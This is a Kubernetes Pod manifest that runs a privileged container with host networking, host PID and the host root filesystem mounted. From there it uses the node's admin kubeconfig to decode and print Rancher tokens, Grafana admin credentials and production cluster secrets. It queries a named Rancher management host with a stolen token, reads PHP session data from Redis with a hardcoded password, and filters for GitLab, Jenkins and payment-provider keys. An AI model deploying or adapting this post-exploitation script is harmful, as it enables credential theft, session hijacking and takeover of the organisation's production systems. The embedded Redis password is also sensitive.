apiVersion: v1
kind: Pod
metadata:
  name: network-access
  namespace: egam-production
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: shell
    image: alpine:3.19
    command:
      - /bin/sh
      - -c
      - |
        apk add --no-cache util-linux curl jq openssl redis > /dev/null 2>&1

        # Installa kubectl
        curl -LO "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" 2>/dev/null
        chmod +x kubectl
        mv kubectl /usr/local/bin/ 2>/dev/null || true

        # Usa il kubeconfig del nodo
        export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml

        echo "=========================================="
        echo "=== 1. RANCHER TOKEN (from cattle-credentials) ==="
        echo "=========================================="
        kubectl get secret cattle-credentials-269b1fd2be -n cattle-system -o jsonpath='{.data}' 2>&1 | jq -r 'to_entries[] | .key + "=" + (.value | @base64d)' 2>&1 || echo "NOT FOUND"

        echo "=========================================="
        echo "=== 2. GRAFANA CREDENTIALS ==="
        echo "=========================================="
        echo -n "USER: "
        kubectl get secret rancher-monitoring-grafana -n cattle-monitoring-system -o jsonpath='{.data.admin-user}' 2>&1 | base64 -d 2>&1 || echo "NOT FOUND"
        echo ""
        echo -n "PASSWORD: "
        kubectl get secret rancher-monitoring-grafana -n cattle-monitoring-system -o jsonpath='{.data.admin-password}' 2>&1 | base64 -d 2>&1 || echo "NOT FOUND"
        echo ""

        echo "=========================================="
        echo "=== 3. ALL SECRETS IN cattle-system ==="
        echo "=========================================="
        kubectl get secrets -n cattle-system 2>&1 | head -50 || echo "NOT FOUND"

        echo "=========================================="
        echo "=== 4. RANCHER TOKEN (from cattle-system) ==="
        echo "=========================================="
        kubectl get secret cattle-credentials-269b1fd2be -n cattle-system -o jsonpath='{.data.token}' 2>&1 | base64 -d 2>&1 || echo "NOT FOUND"
        echo ""

        echo "=========================================="
        echo "=== 5. PRODUCTION CLUSTER SECRETS (c-m-5zwstccv) ==="
        echo "=========================================="
        # Estrai il token Rancher
        RTOKEN=$(kubectl get secret cattle-credentials-269b1fd2be -n cattle-system -o jsonpath='{.data.token}' 2>/dev/null | base64 -d 2>/dev/null)
        if [ -n "$RTOKEN" ]; then
          echo "Token found: ${RTOKEN:0:20}..."
          curl -k -H "Authorization: Bearer $RTOKEN" "https://rancher.management.egam.com.br/k8s/clusters/c-m-5zwstccv/v1/secrets" 2>&1 | jq -r '.items[] | .metadata.namespace + "/" + .metadata.name' 2>&1 | head -100 || echo "FAILED"
        else
          echo "NO TOKEN"
        fi

        echo "=========================================="
        echo "=== 6. REDIS SESSION DATA ==="
        echo "=========================================="
        redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP KEYS 'PHPREDIS_SESSION:*' 2>/dev/null | head -5 | while read k; do
          echo "KEY: $k"
          redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP GET "$k" 2>/dev/null | head -c 300
          echo ""
          echo "---"
        done

        echo "=========================================="
        echo "=== 7. ALL PRODUCTION SECRETS (decoded) ==="
        echo "=========================================="
        if [ -n "$RTOKEN" ]; then
          curl -k -H "Authorization: Bearer $RTOKEN" "https://rancher.management.egam.com.br/k8s/clusters/c-m-5zwstccv/v1/secrets" 2>/dev/null | jq -r '.items[] | select(.metadata.namespace == "egam-production") | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>/dev/null | head -50 || echo "FAILED"
        fi

        echo "=========================================="
        echo "=== 8. GITLAB/JENKINS/PAGARME CREDENTIALS ==="
        echo "=========================================="
        if [ -n "$RTOKEN" ]; then
          curl -k -H "Authorization: Bearer $RTOKEN" "https://rancher.management.egam.com.br/k8s/clusters/c-m-5zwstccv/v1/secrets" 2>/dev/null | jq -r '.items[] | select(.metadata.namespace == "egam-production") | .data | to_entries[] | select(.key | test("gitlab|jenkins|pagar|stripe|token|password|secret|key"; "i")) | .key + "=" + (.value | @base64d)' 2>/dev/null | head -50 || echo "FAILED"
        fi

        echo "=========================================="
        echo "=== DONE ==="
        echo "=========================================="
        sleep 36000
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
